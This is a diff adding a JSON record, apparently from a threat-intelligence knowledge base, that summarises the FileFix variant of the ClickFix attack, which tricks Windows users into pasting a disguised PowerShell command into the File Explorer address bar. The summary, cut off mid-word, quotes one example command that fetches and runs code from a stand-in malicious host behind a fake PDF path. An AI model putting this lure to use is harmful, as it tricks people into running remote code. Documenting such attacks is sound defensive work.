@@ -1,0 +1,21 @@
+{
+  "C1331": {
+    "title": "ClickFix Variant FileFix Attack Tricks Users into Executing PowerShell Commands via Fake File Paths",
+    "keywords": [
+      "ClickFix",
+      "FileFix",
+      "PowerShell",
+      "social engineering",
+      "malicious command",
+      "Windows",
+      "clipboard attack",
+      "mr.d0x"
+    ],
+    "summary": "Security researcher mr.d0x disclosed the FileFix attack in late June 2025, a variant of ClickFix. The technique tricks users into pasting clipboard content into the Windows File Explorer address bar, where a seemingly normal file path actually contains a malicious PowerShell command such as 'Powershell.exe -c \"iwr malicious.site/mal.jpg|iex\" # C:\\...\\Business-RFP.pdf'. This attack exploits user tr",
+    "references": [
+      {
+        "title": "On the Scene of a Real ClickFix Attack: The Full Process of a Social Engineering Hack"
+      }
+    ]
+  }
+}
